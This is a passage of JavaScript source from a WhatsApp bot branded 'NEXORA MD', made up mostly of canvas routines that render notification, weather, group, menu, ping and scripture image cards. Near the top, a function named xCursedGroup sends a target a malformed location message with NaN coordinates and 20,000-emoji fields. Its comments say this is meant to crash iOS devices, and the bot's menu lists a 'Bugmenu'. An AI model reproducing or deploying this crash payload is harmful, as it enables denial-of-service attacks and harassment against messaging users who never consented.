                        thumbnailUrl: thumbnailUrl,
                        sourceUrl: "https://whatsapp.com/channel/0029VbC0knY72WU0QUNAid3B",
                        mediaType: 1,
                        renderLargerThumbnail: false
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363407115364926@newsletter",
                        newsletterName: "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2",
                        serverMessageId: -1
                    }
                },
                headerType: 6,
                viewOnce: false
            }, { quoted: m });
        }
        
              
// 2. xCursed Group iOS Special

async function xCursedGroup(target) {
    try {
        let msg = {
            groupStatusMessageV2: {
                message: {
                    locationMessage: {
                        degreesLatitude: NaN, // Mathematics error triggers iOS crash
                        degreesLongitude: NaN,
                        name: "🔥".repeat(20000), 
                        address: "🔥".repeat(20000), 
                        url: `https://wa.me/settings`, // Triggers internal link loop
                        jpegThumbnail: Buffer.from([0x00]),
                    },
                },
            },
        };
        await empire.relayMessage(target, msg, { 
            participant: { jid: target }, 
            messageId: empire.generateMessageTag() 
        });
    } catch (e) { console.error(e) }
}

async function createAnonymous(type, text) {
    const { createCanvas } = require('@napi-rs/canvas');
    
    // Internal Helper: Wrap Text (Fixes "wrapText is not defined" error)
    const internalWrap = (ctx, text, x, y, maxWidth, lineHeight) => {
        const words = text.split(' ');
        let line = '';
        for (let n = 0; n < words.length; n++) {
            const testLine = line + words[n] + ' ';
            const width = ctx.measureText(testLine).width;
            if (width > maxWidth && n > 0) {
                ctx.fillText(line, x, y);
                line = words[n] + ' ';
                y += lineHeight;
            } else {
                line = testLine;
            }
        }
        ctx.fillText(line, x, y);
    };

    const w = 800;
    const h = 450;
    const canvas = createCanvas(w, h);
    const ctx = canvas.getContext('2d');
    const now = new Date();

    // 1. Background
    const grad = ctx.createLinearGradient(0, 0, 0, h);
    grad.addColorStop(0, "#1a1a2e");
    grad.addColorStop(1, "#0f0f1a");
    ctx.fillStyle = grad;
    ctx.fillRect(0, 0, w, h);

    // 2. Status Bar
    ctx.fillStyle = "white";
    ctx.font = "bold 20px Arial";
    const timeStr = now.getHours().toString().padStart(2, '0') + ":" + now.getMinutes().toString().padStart(2, '0');
    ctx.fillText(timeStr, 50, 45);

    // Battery
    ctx.strokeStyle = "rgba(255, 255, 255, 0.5)";
    ctx.strokeRect(710, 28, 40, 18);
    ctx.fillStyle = "#22c55e";
    ctx.fillRect(712, 30, 36, 14); // 100%
    ctx.fillStyle = "white";
    ctx.font = "14px Arial";
    ctx.fillText("100%", 665, 42);

    // 3. Date
    ctx.textAlign = "center";
    ctx.font = "24px Arial";
    const dateStr = now.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric' });
    ctx.fillText(dateStr, w / 2, 110);

    // 4. Notification Bubble (With Fallback for older Napi-RS)
    const bX = 40, bY = 160, bW = 720, bH = 180;
    ctx.fillStyle = "rgba(255, 255, 255, 0.1)";
    if (ctx.roundRect) {
        ctx.roundRect(bX, bY, bW, bH, 20);
        ctx.fill();
    } else {
        // Fallback if roundRect is not supported
        ctx.fillRect(bX, bY, bW, bH);
    }

    // Header
    ctx.textAlign = "center";
    ctx.fillStyle = type === "confess" ? "#fb7185" : "#38bdf8";
    ctx.font = "bold 22px Arial";
    let title = type === "confess" ? "💔 Confession" : type === "iphone" ? "💬 iMessage" : "📩 Anonymous";
    ctx.fillText(title, 70, bY + 45);
    
    ctx.fillStyle = "rgba(255, 255, 255, 0.4)";
    ctx.font = "16px Arial";
    ctx.fillText("now", 690, bY + 45);

    // Message Body
    ctx.fillStyle = "white";
    ctx.font = "24px Arial";
    internalWrap(ctx, text, 70, bY + 90, 660, 32);

    // 5. Swipe Hint
    ctx.textAlign = "center";
    ctx.fillStyle = "rgba(255, 255, 255, 0.3)";
    ctx.font = "16px Arial";
    ctx.fillText("Swipe up to open", w / 2, 420);

    return canvas.toBuffer('image/png');
}
async function drawWeatherCard(location, condition, currentTemp, feelsLike, minTemp, maxTemp, humidity, windSpeed, sunrise, sunset) {
    const { createCanvas } = require('@napi-rs/canvas');
    const canvas = createCanvas(900, 500);
    const ctx = canvas.getContext('2d');

    // 1. Sleek Midnight-Black Textured Background
    const bgGrad = ctx.createLinearGradient(0, 0, 900, 500);
    bgGrad.addColorStop(0, '#030406');
    bgGrad.addColorStop(0.5, '#090d14');
    bgGrad.addColorStop(1, '#050608');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, 900, 500);

    // Dynamic grid overlay lines (subtle tech vibe)
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.01)';
    ctx.lineWidth = 1;
    for (let i = 0; i < 900; i += 50) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, 500); ctx.stroke();
    }

    // 2. Dual Glassmorphic Panel Layout
    ctx.fillStyle = 'rgba(255, 255, 255, 0.02)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1.5;

    // Card Left: Core Temperature Display Panel
    ctx.beginPath(); ctx.roundRect ? ctx.roundRect(40, 40, 360, 420, 16) : ctx.rect(40, 40, 360, 420); ctx.fill(); ctx.stroke();
    // Card Right: Metric Sub-Grid Panel
    ctx.beginPath(); ctx.roundRect ? ctx.roundRect(430, 40, 430, 420, 16) : ctx.rect(430, 40, 430, 420); ctx.fill(); ctx.stroke();

    // Top Header Accent Border Highlight (Right Card)
    ctx.fillStyle = '#00e5ff';
    ctx.fillRect(430, 40, 430, 4);

    // 3. Populate LEFT Card (Thermal Status)
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 24px Arial';
    ctx.fillText(location.toUpperCase(), 75, 95);

    ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
    ctx.font = '13px Courier New';
    ctx.fillText('METEOROLOGICAL STATION', 75, 120);

    // Big Main Temperature Reading
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 84px Courier New';
    ctx.fillText(`${Math.round(currentTemp)}°`, 75, 240);

    // Condition Status Label
    ctx.fillStyle = '#00e5ff';
    ctx.font = 'bold 18px Arial';
    ctx.fillText(condition.toUpperCase(), 75, 290);

    ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
    ctx.font = '14px Arial';
    ctx.fillText(`Feels Like: ${feelsLike}°C`, 75, 325);
    ctx.fillText(`Range: ${minTemp}°C / ${maxTemp}°C`, 75, 350);


    // 4. Populate RIGHT Card (Data Parameter Columns)
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 20px Arial';
    ctx.fillText('ENVIRONMENTAL METRICS', 465, 90);

    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(465, 115); ctx.lineTo(825, 115); ctx.stroke();

    const drawWeatherRow = (label, value, yPos) => {
        ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
        ctx.font = '15px Arial';
        ctx.fillText(label, 465, yPos);

        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 16px Courier New';
        ctx.textAlign = 'right';
        ctx.fillText(value, 825, yPos);
        ctx.textAlign = 'left';
    };

    drawWeatherRow('Atmospheric Humidity', `${humidity}%`, 165);
    drawWeatherRow('Wind Vector Speed', `${windSpeed} km/h`, 220);
    drawWeatherRow('Solar Sunrise Epoch', sunrise, 275);
    drawWeatherRow('Solar Sunset Epoch', sunset, 330);

    // Decorative Progress Bar style element for Humidity Tracking inside Canvas
    ctx.fillStyle = 'rgba(255, 255, 255, 0.04)';
    ctx.beginPath(); ctx.roundRect ? ctx.roundRect(465, 380, 360, 6, 3) : ctx.rect(465, 380, 360, 6); ctx.fill();
    
    ctx.fillStyle = '#00e5ff';
    ctx.beginPath(); ctx.roundRect ? ctx.roundRect(465, 380, Math.max(10, 360 * (humidity / 100)), 6, 3) : ctx.rect(465, 380, 360 * (humidity / 100), 6); ctx.fill();


    // 5. Footer Systems Signature Anchor Details
    ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
    ctx.font = '11px Courier New';
    ctx.fillText('NEXORA MATRIX CLOUD ENGINE // WTTR REPOSITORY DATA VIA ASAD-CORE', 75, 435);

    return canvas.toBuffer('image/png');
}

async function drawGroupInfoCard(groupName, description, adminCount, adminList, dateCreated) {
    const { createCanvas } = require('@napi-rs/canvas');
    
    // 1. Setup text metrics and line-wrapping for the Group Description text block
    const canvasWidth = 950;
    const padding = 65;
    const maxTextWidth = canvasWidth - (padding * 2);
    
    const testCanvas = createCanvas(100, 100);
    const testCtx = testCanvas.getContext('2d');
    testCtx.font = '16px Arial';
    
    // Process description blocks smoothly to prevent layout overlaps
    const cleanDesc = description ? description.replace(/\s+/g, ' ').trim() : "No description provided for this terminal sector.";
    const words = cleanDesc.split(' ');
    let descLines = [];
    let currentLine = '';
    
    for (let n = 0; n < words.length; n++) {
        let testLine = currentLine + words[n] + ' ';
        let metrics = testCtx.measureText(testLine);
        if (metrics.width > maxTextWidth && n > 0) {
            descLines.push(currentLine.trim());
            currentLine = words[n] + ' ';
        } else {
            currentLine = testLine;
        }
    }
    descLines.push(currentLine.trim());
    
    // Calculate canvas constraints dynamically based on description volume length
    const descLineHeight = 26;
    const baseHeight = 520; // Structural spacing up to the description box header
    const calculatedHeight = baseHeight + (descLines.length * descLineHeight) + 80;
    const finalCanvasHeight = Math.max(calculatedHeight, 680);

    // 2. Base Canvas Layer Construction
    const canvas = createCanvas(canvasWidth, finalCanvasHeight);
    const ctx = canvas.getContext('2d');

    // Midnight Velvet Dark Background Gradient
    const bgGrad = ctx.createLinearGradient(0, 0, canvasWidth, finalCanvasHeight);
    bgGrad.addColorStop(0, '#030406');
    bgGrad.addColorStop(0.5, '#0a0d14');
    bgGrad.addColorStop(1, '#050608');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, canvasWidth, finalCanvasHeight);

    // Tech mesh accent grid lines
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.008)';
    ctx.lineWidth = 1;
    for (let i = 0; i < canvasWidth; i += 50) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, finalCanvasHeight); ctx.stroke();
        ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(canvasWidth, i); ctx.stroke();
    }

    // 3. Central Glassmorphic Containment Panel
    ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(40, 40, canvasWidth - 80, finalCanvasHeight - 80, 16) : ctx.rect(40, 40, canvasWidth - 80, finalCanvasHeight - 80);
    ctx.fill();
    ctx.stroke();

    // Top Neon Border Graphic Strip
    ctx.fillStyle = '#00e5ff';
    ctx.fillRect(40, 40, canvasWidth - 80, 4);

    // 4. Header Section Typography
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 28px Arial';
    ctx.fillText(groupName.toUpperCase(), 75, 95);

    ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
    ctx.font = '13px Courier New';
    ctx.fillText('DIRECTORY: /ROOT/NEXORA_MD/METADATA_EXTRACTOR/GROUP_SYNC', 75, 122);

    // Premium horizontal divider line
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(75, 150); ctx.lineTo(canvasWidth - 75, 150); ctx.stroke();

    // 5. Parameter Key/Value Grid Layout Rows
    const drawGridRow = (label, data, yPos, valColor = '#ffffff') => {
        ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
        ctx.font = '15px Arial';
        ctx.fillText(label, 75, yPos);

        ctx.fillStyle = valColor;
        ctx.font = 'bold 16px Courier New';
        ctx.fillText(data, 320, yPos);
    };

    drawGridRow('METADATA SECTOR NAME', groupName, 200);
    drawGridRow('DATE SECTOR CREATED', dateCreated, 245);
    drawGridRow('ADMINISTRATIVE LEVEL', `${adminCount} SECTOR OVERSEERS`, 290, '#00e5ff');

    // 6. Secondary Frosted Sub-Panel: Admin Listing
    ctx.fillStyle = 'rgba(255, 255, 255, 0.01)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.03)';
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(75, 330, canvasWidth - 150, 110, 8) : ctx.rect(75, 330, canvasWidth - 150, 110);
    ctx.fill();
    ctx.stroke();

    ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
    ctx.font = '13px Arial';
    ctx.fillText('IDENTIFIED OPERATOR KEYS (ADMINS):', 95, 360);

    // Dynamic clean text string formatting for admin array rows inside sub-card boundaries
    ctx.fillStyle = '#ffffff';
    ctx.font = '14px Courier New';
    const truncatedAdmins = adminList.length > 50 ? adminList.substring(0, 47) + '...' : adminList;
    ctx.fillText(truncatedAdmins, 95, 395);

    // 7. Third Frosted Sub-Panel: Description Terminal
    let descBoxStartY = 475;
    ctx.fillStyle = 'rgba(255, 255, 255, 0.01)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.03)';
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(75, descBoxStartY, canvasWidth - 150, (descLines.length * descLineHeight) + 40, 8) : ctx.rect(75, descBoxStartY, canvasWidth - 150, (descLines.length * descLineHeight) + 40);
    ctx.fill();
    ctx.stroke();

    ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
    ctx.font = '13px Arial';
    ctx.fillText('SECTOR PROFILE CONFIG (DESCRIPTION):', 95, descBoxStartY + 25);

    ctx.fillStyle = 'rgba(255, 255, 255, 0.85)';
    ctx.font = '15px Arial';
    for (let i = 0; i < descLines.length; i++) {
        ctx.fillText(descLines[i], 95, descBoxStartY + 60 + (i * descLineHeight));
    }

    // 8. Footer Systems Signature Anchor Details
    ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
    ctx.font = '12px Courier New';
    ctx.fillText('NEXORA MATRIX SECURITY HUB // REAL-TIME BAILEYS HANDSHAKE MATRIX', 75, finalCanvasHeight - 65);

    return canvas.toBuffer('image/png');
}

async function drawFullMenuImage(pushName, date, time, day, botMood, botMode, currentCash, prefix) {
    const { createCanvas } = require('@napi-rs/canvas');
    const canvas = createCanvas(1000, 1050); // Tall canvas to fit all elements cleanly
    const ctx = canvas.getContext('2d');

    // 1. Sleek Midnight-Black Textured Background
    const bgGrad = ctx.createLinearGradient(0, 0, 1000, 1050);
    bgGrad.addColorStop(0, '#040508');
    bgGrad.addColorStop(0.5, '#0a0d14');
    bgGrad.addColorStop(1, '#050609');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, 1000, 1050);

    // Tech mesh accent grid lines (very subtle)
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.01)';
    ctx.lineWidth = 1;
    for (let i = 0; i < 1000; i += 50) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, 1050); ctx.stroke();
        ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(1000, i); ctx.stroke();
    }

    // 2. TOP CARDS: Glassmorphic Status Panels (Left Profile & Right Systems)
    ctx.fillStyle = 'rgba(255, 255, 255, 0.02)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.06)';
    ctx.lineWidth = 1.5;

    // Card Top-Left: User Profile Passport
    ctx.beginPath(); ctx.roundRect ? ctx.roundRect(40, 40, 440, 260, 14) : ctx.rect(40, 40, 440, 260); ctx.fill(); ctx.stroke();
    // Card Top-Right: Engine Stats Profile
    ctx.beginPath(); ctx.roundRect ? ctx.roundRect(520, 40, 440, 260, 14) : ctx.rect(520, 40, 440, 260); ctx.fill(); ctx.stroke();

    // Populate Left Card (Profile Passport)
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 28px Arial';
    ctx.fillText(pushName.toUpperCase(), 75, 95);
    ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
    ctx.font = '13px Arial';
    ctx.fillText('AUTHORIZED SYSTEM OPERATOR', 75, 120);

    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(75, 145); ctx.lineTo(440, 145); ctx.stroke();

    ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
    ctx.font = '13px Arial';
    ctx.fillText('ACCOUNT WALLET BALANCE', 75, 190);
    ctx.fillStyle = '#00e5ff'; // Cyan pop
    ctx.font = 'bold 36px Courier New';
    ctx.fillText(`$${currentCash.toLocaleString()}`, 75, 235);

    // Populate Right Card (Central Engine Specs)
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 22px Arial';
    ctx.fillText('NEXORA CORE CENTRAL COMMAND', 550, 90);

    const drawRow = (label, data, y, valColor = '#ffffff') => {
        ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
        ctx.font = '14px Arial';
        ctx.fillText(label, 550, y);
        ctx.fillStyle = valColor;
        ctx.font = 'bold 15px Courier New';
        ctx.textAlign = 'right';
        ctx.fillText(data, 925, y);
        ctx.textAlign = 'left';
    };
    drawRow('Deployment Security Mode', botMode.toUpperCase(), 140, '#00e5ff');
    drawRow('Central System Mood', botMood, 180);
    drawRow('Server Calendar Stamp', date, 220);
    drawRow('Active Node Clock', `${time} (${day.toUpperCase()})`, 260);


    // 3. BOTTOM PANEL: Large Main Menu Console Terminal
    ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(40, 340, 920, 650, 16) : ctx.rect(40, 340, 920, 650);
    ctx.fill();
    ctx.stroke();

    // Neon Header Indicator Bar for Main Console
    ctx.fillStyle = '#00e5ff';
    ctx.fillRect(40, 340, 920, 4);

    // Terminal Heading Title Text
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 20px Arial';
    ctx.fillText('⚡ AVAILABLE INTERACTION MENUS COMMAND FILES', 75, 390);

    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.font = '13px Courier New';
    ctx.fillText('DIRECTORY: /ROOT/NEXORA_MD/COMMAND_CORE/*', 75, 415);

    // 4. COLUMN LAYOUT: Draw the available menu commands in double clean grids
    const menuItems = [
        'ownermenu', 'Groupmenu', 'Bugmenu', 'xxxmenu',
        'Downloadmenu', 'simulatormenu', 'Stickermenu', 'AImenu',
        'Toolsmenu', 'Funmenu', 'imagemenu', 'footballmenu',
        'cybermenu', 'Voicemenu'
    ];

    let startXLeft = 90;
    let startXRight = 530;
    let startY = 480;
    let rowSpacing = 65;

    menuItems.forEach((item, index) => {
        // Switch between columns automatically using basic math calculations
        let isLeftColumn = index % 2 === 0;
        let colX = isLeftColumn ? startXLeft : startXRight;
        let colY = startY + (Math.floor(index / 2) * rowSpacing);

        // Draw an elegant bounding selection node box for each command
        ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.03)';
        ctx.beginPath();
        ctx.roundRect ? ctx.roundRect(colX, colY - 32, 380, 46, 6) : ctx.rect(colX, colY - 32, 380, 46);
        ctx.fill();
        ctx.stroke();

        // Small indicator tech node diamond box
        ctx.fillStyle = '#00e5ff';
        ctx.fillRect(colX + 15, colY - 14, 8, 8);

        // The actual Text Command String Label drawing
        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 16px Courier New';
        ctx.fillText(`${prefix}${item.toUpperCase()}`, colX + 40, colY - 6);
    });

    // 5. Footer Signature inside drawing
    ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
    ctx.font = '12px Courier New';
    ctx.fillText('NEXORA ARCH AUTOMATION MODULE V3.0 // SYSTEMS OPERATIONAL', 75, 955);
    ctx.fillText('THEME // SATORU x ITACHI EXTENSION', 75, 975);

    return canvas.toBuffer('image/png');
}
async function drawFullPingImage(latency, indicator, statusEmoji, ramUsage, totalRam, uptime, serverTime) {
    const { createCanvas } = require('@napi-rs/canvas');
    const canvas = createCanvas(850, 480);
    const ctx = canvas.getContext('2d');

    // 1. Sleek Midnight-Black Textured Background
    const bgGrad = ctx.createLinearGradient(0, 0, 850, 480);
    bgGrad.addColorStop(0, '#040508');
    bgGrad.addColorStop(0.5, '#0a0d14');
    bgGrad.addColorStop(1, '#050609');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, 850, 480);

    // Subtle tech accent grid lines
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.01)';
    ctx.lineWidth = 1;
    for (let i = 0; i < 850; i += 40) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, 480); ctx.stroke();
    }
    for (let i = 0; i < 480; i += 40) {
        ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(850, i); ctx.stroke();
    }

    // 2. Main Glassmorphic Panel Container
    ctx.fillStyle = 'rgba(255, 255, 255, 0.02)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.06)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(40, 40, 770, 400, 16) : ctx.rect(40, 40, 770, 400);
    ctx.fill();
    ctx.stroke();

    // 3. Header Text Integration
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 26px Arial';
    ctx.fillText('NEXORA ENGINE CORE TELEMETRY', 75, 95);

    // Premium Divider Line
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(75, 120); ctx.lineTo(775, 120); ctx.stroke();

    // 4. Status Indicator Glow Pill (Picks up safety color shifts)
    let indicatorColor = '#00ffaa'; // Green (Excellent)
    if (latency >= 200 && latency < 500) indicatorColor = '#ffcc00'; // Yellow (Stable)
    if (latency >= 500) indicatorColor = '#ff3366'; // Red (High Load)

    // Frosted pill container background
    ctx.fillStyle = 'rgba(255, 255, 255, 0.03)';
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(545, 68, 230, 38, 8) : ctx.rect(545, 68, 230, 38);
    ctx.fill();

    // Small glowing colored anchor circle
    ctx.fillStyle = indicatorColor;
    ctx.beginPath(); ctx.arc(565, 87, 6, 0, Math.PI * 2); ctx.fill();

    // Strip emojis/messy text from the raw indicator string for a clean UI look
    const statusText = indicator.replace(/💧/g, '').replace(/-/g, ' ').trim().toUpperCase();
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 13px Arial';
    ctx.fillText(statusText, 582, 92);

    // 5. Grid Stats Renderer
    const drawPingStat = (label, value, x, y) => {
        ctx.fillStyle = 'rgba(255, 255, 255, 0.4)';
        ctx.font = '14px Arial';
        ctx.fillText(label.toUpperCase(), x, y);

        ctx.fillStyle = '#ffffff';
        ctx.font = 'bold 24px Courier New';
        ctx.fillText(value, x, y + 35);
    };

    // Populate Metrics Grid Rows
    drawPingStat('System Latency', `${latency} MS`, 80, 185);
    drawPingStat('Server Clock', serverTime, 460, 185);
    drawPingStat('Engine Uptime', uptime, 80, 305);
    drawPingStat('RAM Allocations', `${ramUsage} MB / ${parseInt(totalRam)} GB`, 460, 305);

    // 6. Interactive Active RAM Usage Bar
    const usedRamNum = parseFloat(ramUsage);
    const totalRamNum = parseFloat(totalRam) * 1024; 
    const ramPercentage = Math.min((usedRamNum / totalRamNum) * 100, 100);

    // RAM Bar Track
    ctx.fillStyle = 'rgba(255, 255, 255, 0.04)';
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(460, 360, 315, 8, 4) : ctx.rect(460, 360, 315, 8);
    ctx.fill();

    // RAM Bar active fill
    ctx.fillStyle = indicatorColor;
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(460, 360, Math.max(10, 315 * (ramPercentage / 100)), 8, 4) : ctx.rect(460, 360, 315 * (ramPercentage / 100), 8);
    ctx.fill();

    // Bottom structural signature lines
    ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
    ctx.font = '12px Courier New';
    ctx.fillText('NEXORA AUTOMATION ENGINE v3.0 // DIAGNOSTIC TRACE COMPLETE', 80, 415);

    return canvas.toBuffer('image/png');
}
async function drawBibleVerseCard(reference, textContent) {
    const { createCanvas } = require('@napi-rs/canvas');
    
    // 1. Initial configuration for dynamic wrapping
    const canvasWidth = 900;
    const padding = 65;
    const maxTextWidth = canvasWidth - (padding * 2);
    
    // Set up text metrics temporarily to calculate line counts dynamically
    const testCanvas = createCanvas(100, 100);
    const testCtx = testCanvas.getContext('2d');
    testCtx.font = 'italic 22px "Times New Roman"'; // Serif font adds a classic scriptural aesthetic
    
    const words = textContent.replace(/\s+/g, ' ').trim().split(' ');
    let lines = [];
    let currentLine = '';
    
    for (let n = 0; n < words.length; n++) {
        let testLine = currentLine + words[n] + ' ';
        let metrics = testCtx.measureText(testLine);
        if (metrics.width > maxTextWidth && n > 0) {
            lines.push(currentLine.trim());
            currentLine = words[n] + ' ';
        } else {
            currentLine = testLine;
        }
    }
    lines.push(currentLine.trim());
    
    // Dynamic Height calculation based on layout line volume
    const lineHeight = 36;
    const headerHeight = 160;
    const footerHeight = 90;
    const calculatedCanvasHeight = headerHeight + (lines.length * lineHeight) + footerHeight;
    
    // Enforce constraints to keep the layout proportional
    const finalCanvasHeight = Math.max(calculatedCanvasHeight, 400);

    // 2. Main Canvas Generation Setup
    const canvas = createCanvas(canvasWidth, finalCanvasHeight);
    const ctx = canvas.getContext('2d');

    // Midnight Velvet Gradient Background
    const bgGrad = ctx.createLinearGradient(0, 0, canvasWidth, finalCanvasHeight);
    bgGrad.addColorStop(0, '#030406');
    bgGrad.addColorStop(0.5, '#090b11');
    bgGrad.addColorStop(1, '#050608');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, canvasWidth, finalCanvasHeight);

    // Subtle aesthetic geometry accent lines
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.008)';
    ctx.lineWidth = 1;
    for (let i = 0; i < canvasWidth; i += 50) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, finalCanvasHeight); ctx.stroke();
    }

    // 3. Main Glassmorphic Display Shield Panel
    ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.roundRect ? ctx.roundRect(40, 40, canvasWidth - 80, finalCanvasHeight - 80, 16) : ctx.rect(40, 40, canvasWidth - 80, finalCanvasHeight - 80);
    ctx.fill();
    ctx.stroke();

    // Top Header Accent Border
    ctx.fillStyle = '#00e5ff';
    ctx.fillRect(40, 40, canvasWidth - 80, 4);

    // 4. Header Reference Metadata 
    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 28px Arial';
    ctx.fillText('NEXORA DIGITAL SCRIPTURES', 75, 95);

    ctx.fillStyle = '#00e5ff'; // Cyan glow title pop
    ctx.font = 'bold 20px Courier New';
    ctx.fillText(`BOOK // REFERENCE: ${reference.toUpperCase()}`, 75, 130);

    // Elegant divider rule line
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
    ctx.beginPath(); ctx.moveTo(75, 160); ctx.lineTo(canvasWidth - 75, 160); ctx.stroke();

    // 5. Draw the Dynamic Text Array Lines
    ctx.fillStyle = 'rgba(255, 255, 255, 0.90)'; // Bright crisp text profile
    ctx.font = 'italic 22px "Times New Roman"';
    
    let textStartY = 210;
    for (let i = 0; i < lines.length; i++) {
        ctx.fillText(lines[i], padding + 10, textStartY + (i * lineHeight));
    }

    // 6. Footer Layout signature details
    ctx.fillStyle = 'rgba(255, 255, 255, 0.2)';
    ctx.font = '12px Courier New';
    ctx.fillText(`DATABASE CONNECT: BIBLE-API // NODE ENVIRO TRACE COMPLETE`, 75, finalCanvasHeight - 65);

    return canvas.toBuffer('image/png');
}
async function drawQuranAyahCard(surahNum, ayahNum, surahName, translationText) {
    const { createCanvas } = require('@napi-rs/canvas');
    
    // 1. Structural configuration for text container safety
    const canvasWidth = 900;
    const padding = 65;
    const maxTextWidth = canvasWidth - (padding * 2);
    
    // Create temporary worker interface to trace pixel dimensions accurately
    const testCanvas = createCanvas(100, 100);
    const testCtx = testCanvas.getContext('2d');
    testCtx.font = 'italic 22px "Georgia"'; // Elegant classic typeface fit for sacred translation texts
    
    const words = translationText.replace(/\s+/g, ' ').trim().split(' ');
    let lines = [];
    let currentLine = '';
    
    for (let n = 0; n < words.length; n++) {
        let testLine = currentLine + words[n] + ' ';
        let metrics = testCtx.measureText(testLine);
        if (metrics.width > maxTextWidth && n > 0) {
            lines.push(currentLine.trim());
            currentLine = words[n] + ' ';
        } else {
            currentLine = testLine;
        }
    }
    lines.push(currentLine.trim());
    
    // Metric parameters calculating frame scales safely
    const lineHeight = 36;
    const headerHeight = 160;
    const footerHeight = 90;
    const calculatedHeight = headerHeight + (lines.length * lineHeight) + footerHeight;
    const finalCanvasHeight = Math.max(calculatedHeight, 400);

    // 2. Base Canvas Layer Construction
    const canvas = createCanvas(canvasWidth, finalCanvasHeight);
    const ctx = canvas.getContext('2d');

    // Premium Velvet Midnight Dark Background Gradient
    const bgGrad = ctx.createLinearGradient(0, 0, canvasWidth, finalCanvasHeight);
    bgGrad.addColorStop(0, '#030406');
    bgGrad.addColorStop(0.5, '#090b11');
    bgGrad.addColorStop(1, '#050608');
    ctx.fillStyle = bgGrad;
    ctx.fillRect(0, 0, canvasWidth, finalCanvasHeight);

    // Tech mesh accent grid lines
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.008)';
    ctx.lineWidth = 1;
    for (let i = 0; i < canvasWidth; i += 50) {
        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, finalCanvasHeight); ctx.stroke();
    }

    // 3. Central Glassmorphic Dashboard Panel Container
    ctx.fillStyle = 'rgba(255, 255, 255, 0.015)';
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
